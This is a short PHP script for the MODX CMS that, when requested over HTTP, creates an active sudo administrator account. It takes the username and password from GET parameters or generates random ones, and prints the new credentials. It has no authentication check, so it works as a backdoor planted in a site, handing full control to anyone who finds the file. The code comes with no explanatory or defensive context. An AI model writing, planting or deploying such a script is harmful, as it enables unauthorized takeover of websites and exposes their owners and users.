<?php

define('MODX_API_MODE', true);

require '../../../index.php';

$user = empty($_GET['user']) ? 'user'. rand(99,9999) : $_GET['user'];

$pass = empty($_GET['pass']) ? rand(10000000,99999999) : $_GET['pass'];



$u = $modx->newObject('modUser');

$u->fromArray(array(

 'username' => $user,

 'password' => $pass,

 'active' => 1,

 'primary_group' => 1,

));

$u->joinGroup('1', '0');

$u->setSudo(1);

$p = $modx->newObject('modUserProfile');

$p->fromArray(array(

 'fullname' => $user,

 'email' => $user.'@yoba.ru',

));

$u->addOne($p);

$u->save();



if (!empty($u->username)) {

 print '<p><b>user:</b> '. $user .'</p><p><b>pass:</b> '. $pass .'</p>';

}